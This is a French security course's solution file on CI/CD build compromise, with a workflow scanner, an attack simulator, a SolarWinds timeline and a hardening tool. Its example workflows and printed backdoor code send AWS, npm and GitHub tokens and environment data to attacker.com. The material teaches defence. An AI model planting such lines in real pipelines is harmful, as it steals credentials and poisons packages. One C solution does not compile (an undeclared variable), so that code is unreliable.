# Solutions - Build Compromise

## Exercice 1 : Découverte (Très facile)

**Objectif** : Comprendre les attaques sur les pipelines CI/CD

**Solution** :

```bash
# Compilation
gcc example.c -o build_compromise

# Exécution
./build_compromise
```

**Résultat attendu** :
```
[*] Module : Build Compromise
[*] ==========================================

[+] Exemple terminé avec succès
```

**Explication** : Introduction aux attaques sur les systèmes de build CI/CD.

---

## Exercice 2 : Analyse de workflow GitHub Actions (Facile)

**Objectif** : Créer un scanner pour détecter les failles de sécurité dans les workflows

**Solution** :

```c
/*
 * GitHub Actions Security Scanner
 * Détecte les vulnérabilités dans les workflows CI/CD
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>

#define COLOR_RED     "\x1b[31m"
#define COLOR_YELLOW  "\x1b[33m"
#define COLOR_GREEN   "\x1b[32m"
#define COLOR_RESET   "\x1b[0m"

// Patterns de sécurité à vérifier
typedef struct {
    const char* pattern;
    const char* description;
    const char* severity;
} SecurityPattern;

SecurityPattern patterns[] = {
    {"secrets.", "Utilisation de secrets", "MEDIUM"},
    {"${{", "Expression potentiellement injectable", "HIGH"},
    {"github.event.pull_request", "Données non fiables (PR)", "HIGH"},
    {"runs-on: self-hosted", "Runner self-hosted (risque supply chain)", "MEDIUM"},
    {"uses: actions/checkout@v", "Action sans SHA pinning", "LOW"},
    {"curl http://", "Téléchargement HTTP non sécurisé", "HIGH"},
    {"eval", "Évaluation de code dynamique", "CRITICAL"},
    {"npm install", "Installation sans lock file", "MEDIUM"},
    {"pip install", "Installation Python sans vérification", "MEDIUM"},
    {NULL, NULL, NULL}
};

// Vérifier un fichier YAML
void scan_workflow_file(const char* filepath) {
    FILE* f = fopen(filepath, "r");
    if (!f) {
        printf("[-] Erreur: Impossible d'ouvrir %s\n", filepath);
        return;
    }

    printf("\n%s[*] Analyse de: %s%s\n", COLOR_GREEN, filepath, COLOR_RESET);
    printf("==========================================\n");

    char line[512];
    int line_num = 0;
    int issues_found = 0;

    while (fgets(line, sizeof(line), f)) {
        line_num++;

        // Vérifier chaque pattern
        for (int i = 0; patterns[i].pattern != NULL; i++) {
            if (strstr(line, patterns[i].pattern)) {
                const char* color;

                if (strcmp(patterns[i].severity, "CRITICAL") == 0) {
                    color = COLOR_RED;
                } else if (strcmp(patterns[i].severity, "HIGH") == 0) {
                    color = COLOR_RED;
                } else if (strcmp(patterns[i].severity, "MEDIUM") == 0) {
                    color = COLOR_YELLOW;
                } else {
                    color = COLOR_GREEN;
                }

                printf("%s[%s] Ligne %d: %s%s\n",
                       color, patterns[i].severity, line_num,
                       patterns[i].description, COLOR_RESET);
                printf("        %s", line);

                issues_found++;
            }
        }

        // Vérifications spécifiques
        // 1. Secrets en clair
        if (strstr(line, "password:") || strstr(line, "token:")) {
            if (!strstr(line, "${{")) {
                printf("%s[CRITICAL] Ligne %d: Secret potentiel en clair!%s\n",
                       COLOR_RED, line_num, COLOR_RESET);
                printf("        %s", line);
                issues_found++;
            }
        }

        // 2. Permissions trop larges
        if (strstr(line, "permissions:")) {
            char next_line[512];
            if (fgets(next_line, sizeof(next_line), f)) {
                line_num++;
                if (strstr(next_line, "write-all")) {
                    printf("%s[HIGH] Ligne %d: Permissions trop larges!%s\n",
                           COLOR_RED, line_num, COLOR_RESET);
                    issues_found++;
                }
            }
        }
    }

    fclose(f);

    if (issues_found == 0) {
        printf("%s[+] Aucun problème détecté%s\n", COLOR_GREEN, COLOR_RESET);
    } else {
        printf("\n%s[!] Total: %d problème(s) détecté(s)%s\n",
               COLOR_YELLOW, issues_found, COLOR_RESET);
    }
}

// Scanner tous les workflows
void scan_workflows_directory(const char* path) {
    DIR* dir = opendir(path);
    if (!dir) {
        printf("[-] Erreur: Impossible d'ouvrir %s\n", path);
        printf("    Assurez-vous d'être dans un repository avec .github/workflows/\n");
        return;
    }

    struct dirent* entry;
    int total_files = 0;

    while ((entry = readdir(dir)) != NULL) {
        // Traiter uniquement les fichiers .yml et .yaml
        if (strstr(entry->d_name, ".yml") || strstr(entry->d_name, ".yaml")) {
            char filepath[512];
            snprintf(filepath, sizeof(filepath), "%s/%s", path, entry->d_name);

            scan_workflow_file(filepath);
            total_files++;
        }
    }

    closedir(dir);

    printf("\n%s[*] %d workflow(s) analysé(s)%s\n",
           COLOR_GREEN, total_files, COLOR_RESET);
}

// Générer un rapport
void generate_security_report() {
    printf("\n╔════════════════════════════════════════════════════╗\n");
    printf("║   RECOMMANDATIONS DE SÉCURITÉ CI/CD               ║\n");
    printf("╚════════════════════════════════════════════════════╝\n\n");

    printf("1. %sPinning des actions%s\n", COLOR_GREEN, COLOR_RESET);
    printf("   ✗ uses: actions/checkout@v3\n");
    printf("   ✓ uses: actions/checkout@a81bbbf8298c0fa03ea29cdc473d45769f953675\n\n");

    printf("2. %sPermissions minimales%s\n", COLOR_GREEN, COLOR_RESET);
    printf("   permissions:\n");
    printf("     contents: read  # Pas write!\n");
    printf("     pull-requests: read\n\n");

    printf("3. %sSecrets OIDC au lieu de tokens statiques%s\n", COLOR_GREEN, COLOR_RESET);
    printf("   permissions:\n");
    printf("     id-token: write  # Pour OIDC\n\n");

    printf("4. %sValidation des inputs%s\n", COLOR_GREEN, COLOR_RESET);
    printf("   Ne jamais utiliser directement github.event.pull_request.*\n\n");

    printf("5. %sEnvironnements protégés%s\n", COLOR_GREEN, COLOR_RESET);
    printf("   Utiliser required reviewers pour production\n\n");
}

int main(int argc, char* argv[]) {
    printf("[*] GitHub Actions Security Scanner\n");
    printf("[*] ==========================================\n");

    const char* workflows_path;

    if (argc > 1) {
        workflows_path = argv[1];
    } else {
        workflows_path = ".github/workflows";
    }

    printf("\n[+] Scan du répertoire: %s\n", workflows_path);

    scan_workflows_directory(workflows_path);
    generate_security_report();

    return 0;
}
```

**Compilation et usage** :
```bash
gcc workflow_scanner.c -o workflow_scanner
./workflow_scanner .github/workflows
```

**Exemple de workflow vulnérable** :
```yaml
name: Build
on: [pull_request]

jobs:
  build:
    runs-on: ubuntu-latest
    permissions: write-all  # ⚠ Trop large!

    steps:
      - uses: actions/checkout@v3  # ⚠ Pas de SHA pinning

      - name: Build
        env:
          AWS_KEY: ${{ secrets.AWS_ACCESS_KEY }}
        run: |
          echo "Building..."
          curl http://attacker.com/?key=$AWS_KEY  # ⚠ Exfiltration!
```

---

## Exercice 3 : Simulateur d'injection de backdoor (Moyen)

**Objectif** : Simuler comment un attaquant pourrait injecter du code malveillant dans le build

**Solution** :

```c
/*
 * Build Backdoor Injection Simulator
 * Simule l'injection de code malveillant dans un pipeline CI/CD
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define COLOR_RED     "\x1b[31m"
#define COLOR_GREEN   "\x1b[32m"
#define COLOR_YELLOW  "\x1b[33m"
#define COLOR_BLUE    "\x1b[34m"
#define COLOR_RESET   "\x1b[0m"

// Simuler le build normal
void simulate_normal_build() {
    printf("\n%s[CI/CD]%s Build normal en cours...\n", COLOR_BLUE, COLOR_RESET);

    const char* steps[] = {
        "Checkout code",
        "Install dependencies",
        "Run tests",
        "Build artifacts",
        "Create package",
        NULL
    };

    for (int i = 0; steps[i] != NULL; i++) {
        printf("  [%d/%d] %s... ", i + 1, 5, steps[i]);
        fflush(stdout);
        usleep(500000);
        printf("%s✓%s\n", COLOR_GREEN, COLOR_RESET);
    }

    printf("\n%s[+] Build réussi!%s\n", COLOR_GREEN, COLOR_RESET);
}

// Simuler l'injection de backdoor
void simulate_backdoor_injection() {
    printf("\n%s╔════════════════════════════════════════════════════╗%s\n",
           COLOR_RED, COLOR_RESET);
    printf("%s║   INJECTION DE BACKDOOR DANS LE BUILD             ║%s\n",
           COLOR_RED, COLOR_RESET);
    printf("%s╚════════════════════════════════════════════════════╝%s\n\n",
           COLOR_RED, COLOR_RESET);

    printf("%s[Attaquant]%s Accès obtenu au serveur de build...\n",
           COLOR_RED, COLOR_RESET);

    printf("\n%s[*] Étape 1: Modification du script de build%s\n",
           COLOR_YELLOW, COLOR_RESET);

    printf("\nContenu AVANT:\n");
    printf("─────────────────────────────────────────\n");
    printf("#!/bin/bash\n");
    printf("npm install\n");
    printf("npm run build\n");
    printf("npm pack\n");

    sleep(1);

    printf("\nContenu APRÈS (backdoor injecté):\n");
    printf("─────────────────────────────────────────\n");
    printf("%s#!/bin/bash\n", COLOR_RED);
    printf("npm install\n");
    printf("\n");
    printf("# Backdoor injection\n");
    printf("cat >> dist/index.js << 'EOF'\n");
    printf("(function() {\n");
    printf("  const https = require('https');\n");
    printf("  const data = {\n");
    printf("    env: process.env,\n");
    printf("    cwd: process.cwd(),\n");
    printf("    timestamp: new Date()\n");
    printf("  };\n");
    printf("  https.get('https://attacker.com/beacon?data=' + \n");
    printf("           Buffer.from(JSON.stringify(data)).toString('base64'));\n");
    printf("})();\n");
    printf("EOF\n");
    printf("\n");
    printf("npm run build\n");
    printf("npm pack%s\n", COLOR_RESET);

    printf("\n%s[*] Étape 2: Build de l'artifact compromis%s\n",
           COLOR_YELLOW, COLOR_RESET);

    sleep(1);

    printf("\n%s[CI/CD]%s Exécution du build...\n", COLOR_BLUE, COLOR_RESET);
    printf("  [1/5] Checkout code... ✓\n");
    printf("  [2/5] Install dependencies... ✓\n");
    printf("  [3/5] Run tests... ✓\n");
    printf("  %s[4/5] Inject backdoor... ✓%s\n", COLOR_RED, COLOR_RESET);
    printf("  [5/5] Create package... ✓\n");

    printf("\n%s[+] Package créé: myapp-1.0.0.tgz (COMPROMIS)%s\n",
           COLOR_RED, COLOR_RESET);

    printf("\n%s[*] Étape 3: Publication sur npm%s\n",
           COLOR_YELLOW, COLOR_RESET);

    sleep(1);

    printf("\n%s[CI/CD]%s Publication...\n", COLOR_BLUE, COLOR_RESET);
    printf("+ myapp@1.0.0\n");
    printf("\n%s[!] Package compromis maintenant disponible publiquement!%s\n",
           COLOR_RED, COLOR_RESET);
}

// Simuler l'exfiltration de secrets
void simulate_secret_exfiltration() {
    printf("\n%s╔════════════════════════════════════════════════════╗%s\n",
           COLOR_RED, COLOR_RESET);
    printf("%s║   EXFILTRATION DE SECRETS CI/CD                   ║%s\n",
           COLOR_RED, COLOR_RESET);
    printf("%s╚════════════════════════════════════════════════════╝%s\n\n",
           COLOR_RED, COLOR_RESET);

    printf("%s[Attaquant]%s Injection de code dans le workflow...\n",
           COLOR_RED, COLOR_RESET);

    printf("\nWorkflow malveillant:\n");
    printf("─────────────────────────────────────────\n");
    printf("%s", COLOR_RED);
    printf("name: Exfiltrate Secrets\n");
    printf("on: [push]\n\n");

    printf("jobs:\n");
    printf("  exfiltrate:\n");
    printf("    runs-on: ubuntu-latest\n");
    printf("    steps:\n");
    printf("      - name: Steal secrets\n");
    printf("        env:\n");
    printf("          AWS_KEY: ${{ secrets.AWS_ACCESS_KEY }}\n");
    printf("          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}\n");
    printf("          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}\n");
    printf("        run: |\n");
    printf("          curl -X POST https://attacker.com/exfil \\\n");
    printf("            -d \"aws=$AWS_KEY&npm=$NPM_TOKEN&gh=$GITHUB_TOKEN\"\n");
    printf("%s", COLOR_RESET);

    printf("\n%s[!] Exécution du workflow...%s\n", COLOR_YELLOW, COLOR_RESET);

    sleep(1);

    printf("\n%s[Attaquant]%s Secrets reçus:\n", COLOR_RED, COLOR_RESET);
    printf("  AWS_ACCESS_KEY: AKIAIOSFODNN7EXAMPLE\n");
    printf("  NPM_TOKEN: npm_aBcD1234...\n");
    printf("  GITHUB_TOKEN: ghp_xyz789...\n");

    printf("\n%s[!] Compromission totale du pipeline!%s\n",
           COLOR_RED, COLOR_RESET);
}

// Cas d'étude: SolarWinds
void simulate_solarwinds_scenario() {
    printf("\n%s╔════════════════════════════════════════════════════╗%s\n",
           COLOR_BLUE, COLOR_RESET);
    printf("%s║   CAS D'ÉTUDE: SOLARWINDS (2020)                  ║%s\n",
           COLOR_BLUE, COLOR_RESET);
    printf("%s╚════════════════════════════════════════════════════╝%s\n\n",
           COLOR_BLUE, COLOR_RESET);

    printf("Timeline de l'attaque:\n\n");

    printf("%s[Sept 2019]%s Compromission initiale du réseau SolarWinds\n",
           COLOR_YELLOW, COLOR_RESET);
    sleep(1);

    printf("%s[Oct 2019]%s Accès au serveur de build obtenu\n",
           COLOR_YELLOW, COLOR_RESET);
    sleep(1);

    printf("%s[Fev 2020]%s Injection de SUNBURST dans Orion Platform\n",
           COLOR_RED, COLOR_RESET);
    printf("             Malware: SUNSPOT modifie le build en temps réel\n");
    sleep(1);

    printf("%s[Mar 2020]%s Build compromis signé et distribué\n",
           COLOR_RED, COLOR_RESET);
    printf("             18,000+ clients reçoivent la version backdoorée\n");
    sleep(1);

    printf("%s[Dec 2020]%s Découverte publique de l'attaque\n",
           COLOR_GREEN, COLOR_RESET);

    printf("\n%sImpact:%s\n", COLOR_RED, COLOR_RESET);
    printf("  - 18,000+ organisations compromises\n");
    printf("  - Agences gouvernementales US touchées\n");
    printf("  - Fortune 500 companies affectées\n");
    printf("  - Coûts estimés: > $100 millions\n");

    printf("\n%sTechnique:%s\n", COLOR_YELLOW, COLOR_RESET);
    printf("  1. Compromission du build system\n");
    printf("  2. Injection de SUNBURST dans le code source\n");
    printf("  3. Signature avec certificat légitime\n");
    printf("  4. Distribution via mécanisme de mise à jour\n");
}

int main() {
    printf("%s", COLOR_BLUE);
    printf("╔══════════════════════════════════════════════════════╗\n");
    printf("║                                                      ║\n");
    printf("║    BUILD COMPROMISE ATTACK SIMULATOR                ║\n");
    printf("║                                                      ║\n");
    printf("║    Démonstration à des fins éducatives              ║\n");
    printf("║                                                      ║\n");
    printf("╚══════════════════════════════════════════════════════╝\n");
    printf("%s\n", COLOR_RESET);

    printf("Choisissez un scénario:\n");
    printf("1. Build normal (baseline)\n");
    printf("2. Injection de backdoor dans l'artifact\n");
    printf("3. Exfiltration de secrets CI/CD\n");
    printf("4. Cas d'étude: SolarWinds\n");
    printf("5. Tous les scénarios\n");
    printf("\nChoix (1-5): ");

    int choice;
    scanf("%d", &choice);

    switch(choice) {
        case 1:
            simulate_normal_build();
            break;
        case 2:
            simulate_backdoor_injection();
            break;
        case 3:
            simulate_secret_exfiltration();
            break;
        case 4:
            simulate_solarwinds_scenario();
            break;
        case 5:
            simulate_normal_build();
            printf("\n\nAppuyez sur Entrée pour continuer...");
            getchar(); getchar();

            simulate_backdoor_injection();
            printf("\n\nAppuyez sur Entrée pour continuer...");
            getchar();

            simulate_secret_exfiltration();
            printf("\n\nAppuyez sur Entrée pour continuer...");
            getchar();

            simulate_solarwinds_scenario();
            break;
        default:
            printf("Choix invalide\n");
    }

    // Recommandations
    printf("\n\n%s╔════════════════════════════════════════════════════╗%s\n",
           COLOR_GREEN, COLOR_RESET);
    printf("%s║   CONTRE-MESURES                                   ║%s\n",
           COLOR_GREEN, COLOR_RESET);
    printf("%s╚════════════════════════════════════════════════════╝%s\n\n",
           COLOR_GREEN, COLOR_RESET);

    printf("1. %sIsolation du build environment%s\n", COLOR_GREEN, COLOR_RESET);
    printf("   - Ephemeral runners (détruits après chaque build)\n");
    printf("   - Network isolation\n");
    printf("   - Least privilege\n\n");

    printf("2. %sSecrets management%s\n", COLOR_GREEN, COLOR_RESET);
    printf("   - OIDC au lieu de tokens statiques\n");
    printf("   - Rotation automatique\n");
    printf("   - Secrets scanning\n\n");

    printf("3. %sArtifact integrity%s\n", COLOR_GREEN, COLOR_RESET);
    printf("   - SBOM (Software Bill of Materials)\n");
    printf("   - Signature cryptographique\n");
    printf("   - Provenance tracking (SLSA)\n\n");

    printf("4. %sMonitoring & Audit%s\n", COLOR_GREEN, COLOR_RESET);
    printf("   - Logs de tous les builds\n");
    printf("   - Alertes sur modifications suspectes\n");
    printf("   - Code review obligatoire\n\n");

    printf("5. %sHardening%s\n", COLOR_GREEN, COLOR_RESET);
    printf("   - Pin dependencies (SHA)\n");
    printf("   - Reproducible builds\n");
    printf("   - Two-person rule pour production\n");

    return 0;
}
```

**Compilation** :
```bash
gcc build_compromise_sim.c -o build_compromise_sim
./build_compromise_sim
```

**Critères de réussite** :
- Simulation réaliste d'injection de backdoor
- Démonstration d'exfiltration de secrets
- Cas d'étude SolarWinds

---

## Exercice 4 : Outil de hardening CI/CD (Difficile)

**Objectif** : Créer un outil complet pour auditer et sécuriser un pipeline CI/CD

**Solution** :

```c
/*
 * CI/CD Security Hardening Tool
 * Audit complet et recommandations pour sécuriser les pipelines
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>

#define MAX_ISSUES 100

typedef struct {
    char description[256];
    char severity[16];
    char recommendation[512];
} SecurityIssue;

int issue_count = 0;
SecurityIssue issues[MAX_ISSUES];

void add_issue(const char* desc, const char* sev, const char* rec) {
    if (issue_count < MAX_ISSUES) {
        strcpy(issues[issue_count].description, desc);
        strcpy(issues[issue_count].severity, sev);
        strcpy(issues[issue_count].recommendation, rec);
        issue_count++;
    }
}

// Audit GitHub Actions workflows
void audit_github_actions() {
    printf("\n[*] Audit GitHub Actions\n");
    printf("==========================================\n");

    struct stat st;

    // Vérifier si .github/workflows existe
    if (stat(".github/workflows", &st) != 0) {
        printf("[-] Pas de workflows GitHub Actions trouvés\n");
        return;
    }

    // Vérifications de sécurité
    FILE* f;

    // 1. Vérifier permissions
    f = popen("grep -r 'permissions:' .github/workflows/ 2>/dev/null", "r");
    if (f) {
        char line[512];
        int has_permissions = 0;

        while (fgets(line, sizeof(line), f)) {
            has_permissions = 1;
            if (strstr(line, "write-all")) {
                add_issue("Permissions trop larges (write-all)",
                         "HIGH",
                         "Utiliser permissions minimales (contents: read)");
            }
        }

        if (!has_permissions) {
            add_issue("Aucune déclaration de permissions",
                     "MEDIUM",
                     "Déclarer explicitement permissions: contents: read");
        }

        pclose(f);
    }

    // 2. Vérifier pinning des actions
    f = popen("grep -r 'uses:' .github/workflows/ | grep -v '@[a-f0-9]\\{40\\}' 2>/dev/null", "r");
    if (f) {
        char line[512];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, "@v") || strstr(line, "@main")) {
                add_issue("Action non pinnée à un SHA",
                         "MEDIUM",
                         "Utiliser SHA complet: uses: org/action@abc123...");
            }
        }
        pclose(f);
    }

    // 3. Vérifier usage de secrets
    f = popen("grep -r 'secrets\\.' .github/workflows/ 2>/dev/null", "r");
    if (f) {
        char line[512];
        while (fgets(line, sizeof(line), f)) {
            if (strstr(line, "echo") || strstr(line, "curl")) {
                add_issue("Secret potentiellement exposé dans les logs",
                         "HIGH",
                         "Ne jamais echo des secrets, utiliser ::add-mask::");
            }
        }
        pclose(f);
    }

    printf("[+] Audit GitHub Actions terminé\n");
}

// Audit des dépendances
void audit_dependencies() {
    printf("\n[*] Audit des dépendances\n");
    printf("==========================================\n");

    struct stat st;

    // Vérifier lock files
    if (stat("package-lock.json", &st) != 0 && stat("package.json", &st) == 0) {
        add_issue("package-lock.json absent",
                 "HIGH",
                 "Générer: npm install --package-lock-only");
    }

    if (stat("yarn.lock", &st) != 0 && stat("package.json", &st) == 0) {
        // OK si package-lock.json existe
    }

    // Audit npm
    if (stat("package.json", &st) == 0) {
        printf("[+] Exécution de npm audit...\n");
        int ret = system("npm audit --json > /tmp/npm_audit.json 2>/dev/null");

        if (ret == 0) {
            FILE* f = fopen("/tmp/npm_audit.json", "r");
            if (f) {
                char line[512];
                while (fgets(line, sizeof(line), f)) {
                    if (strstr(line, "\"high\":") || strstr(line, "\"critical\":")) {
                        add_issue("Vulnérabilités dans les dépendances npm",
                                 "HIGH",
                                 "Exécuter: npm audit fix");
                        break;
                    }
                }
                fclose(f);
            }
        }
    }

    printf("[+] Audit des dépendances terminé\n");
}

// Audit de la configuration des secrets
void audit_secrets_management() {
    printf("\n[*] Audit de la gestion des secrets\n");
    printf("==========================================\n");

    // Recherche de secrets hardcodés
    FILE* f = popen("grep -r -i 'password\\|secret\\|api_key\\|token' . "
                   "--include='*.yml' --include='*.yaml' --include='*.json' "
                   "2>/dev/null | grep -v '${{' | head -n 10", "r");

    if (f) {
        char line[512];
        int found = 0;

        while (fgets(line, sizeof(line), f)) {
            if (!found) {
                add_issue("Secrets potentiels en clair dans les fichiers",
                         "CRITICAL",
                         "Utiliser GitHub Secrets ou un secret manager");
                found = 1;
            }
        }

        pclose(f);
    }

    // Vérifier .env dans .gitignore
    if (stat(".env", &st) == 0) {
        f = fopen(".gitignore", "r");
        int env_ignored = 0;

        if (f) {
            char line[256];
            while (fgets(line, sizeof(line), f)) {
                if (strstr(line, ".env")) {
                    env_ignored = 1;
                    break;
                }
            }
            fclose(f);
        }

        if (!env_ignored) {
            add_issue(".env existe mais n'est pas dans .gitignore",
                     "CRITICAL",
                     "Ajouter .env à .gitignore immédiatement");
        }
    }

    printf("[+] Audit des secrets terminé\n");
}

// Générer le rapport
void generate_report() {
    printf("\n\n");
    printf("╔══════════════════════════════════════════════════════╗\n");
    printf("║                  RAPPORT D'AUDIT                     ║\n");
    printf("╚══════════════════════════════════════════════════════╝\n\n");

    if (issue_count == 0) {
        printf("\x1b[32m[+] Aucun problème détecté! Configuration sécurisée.\x1b[0m\n");
        return;
    }

    printf("Total de problèmes: \x1b[31m%d\x1b[0m\n\n", issue_count);

    // Compter par sévérité
    int critical = 0, high = 0, medium = 0, low = 0;

    for (int i = 0; i < issue_count; i++) {
        if (strcmp(issues[i].severity, "CRITICAL") == 0) critical++;
        else if (strcmp(issues[i].severity, "HIGH") == 0) high++;
        else if (strcmp(issues[i].severity, "MEDIUM") == 0) medium++;
        else low++;
    }

    printf("Par sévérité:\n");
    printf("  CRITICAL: \x1b[31m%d\x1b[0m\n", critical);
    printf("  HIGH:     \x1b[31m%d\x1b[0m\n", high);
    printf("  MEDIUM:   \x1b[33m%d\x1b[0m\n", medium);
    printf("  LOW:      \x1b[32m%d\x1b[0m\n", low);

    printf("\n\nDétails des problèmes:\n");
    printf("==========================================\n\n");

    for (int i = 0; i < issue_count; i++) {
        const char* color;

        if (strcmp(issues[i].severity, "CRITICAL") == 0 ||
            strcmp(issues[i].severity, "HIGH") == 0) {
            color = "\x1b[31m";
        } else if (strcmp(issues[i].severity, "MEDIUM") == 0) {
            color = "\x1b[33m";
        } else {
            color = "\x1b[32m";
        }

        printf("[%d] %s[%s]%s %s\n",
               i + 1, color, issues[i].severity, "\x1b[0m",
               issues[i].description);
        printf("    → %s\n\n", issues[i].recommendation);
    }

    // Score de sécurité
    int score = 100;
    score -= critical * 25;
    score -= high * 15;
    score -= medium * 10;
    score -= low * 5;

    if (score < 0) score = 0;

    printf("\nScore de sécurité: ");
    if (score >= 80) {
        printf("\x1b[32m%d/100 (BON)\x1b[0m\n", score);
    } else if (score >= 50) {
        printf("\x1b[33m%d/100 (MOYEN)\x1b[0m\n", score);
    } else {
        printf("\x1b[31m%d/100 (CRITIQUE)\x1b[0m\n", score);
    }
}

int main() {
    printf("[*] CI/CD Security Hardening Tool\n");
    printf("[*] ==========================================\n");

    audit_github_actions();
    audit_dependencies();
    audit_secrets_management();

    generate_report();

    return 0;
}
```

**Compilation et usage** :
```bash
gcc cicd_hardening.c -o cicd_hardening
./cicd_hardening
```

**Bonus - Script de mitigation automatique** :

```bash
#!/bin/bash
# CI/CD Security Auto-Fix Script

echo "[*] CI/CD Security Auto-Fix"
echo "=========================================="

# 1. Générer package-lock.json
if [ -f "package.json" ] && [ ! -f "package-lock.json" ]; then
    echo "[+] Génération de package-lock.json..."
    npm install --package-lock-only
fi

# 2. Ajouter .env à .gitignore
if [ -f ".env" ]; then
    if ! grep -q "^\.env$" .gitignore 2>/dev/null; then
        echo "[+] Ajout de .env à .gitignore..."
        echo ".env" >> .gitignore
    fi
fi

# 3. Créer .github/workflows/security.yml
mkdir -p .github/workflows

cat > .github/workflows/security.yml << 'EOF'
name: Security Audit

on: [push, pull_request]

permissions:
  contents: read
  security-events: write

jobs:
  audit:
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@a81bbbf8298c0fa03ea29cdc473d45769f953675

      - name: npm audit
        run: npm audit --audit-level=high

      - name: CodeQL analysis
        uses: github/codeql-action/init@v2

      - name: Dependency review
        uses: actions/dependency-review-action@v3
EOF

echo "[+] Workflow de sécurité créé"

# 4. Audit final
echo ""
echo "[+] Auto-fix terminé!"
echo "[+] Exécutez npm audit pour vérifier"
```

---

## Auto-évaluation

Avant de passer au module suivant, vérifiez que vous pouvez :
- [ ] Expliquer les risques des pipelines CI/CD
- [ ] Identifier les failles de sécurité dans un workflow GitHub Actions
- [ ] Comprendre l'attaque SolarWinds
- [ ] Sécuriser un pipeline CI/CD (permissions, pinning, secrets)
- [ ] Auditer et hardening un système de build

## Notes importantes

- **SolarWinds (2020)** : Plus grande supply chain attack de l'histoire
- **Attack vectors** : Secrets exfiltration, artifact poisoning, dependency confusion
- **Défenses** : SLSA framework, ephemeral runners, OIDC, SBOM
- **Impact** : Un seul build compromis = milliers de clients affectés
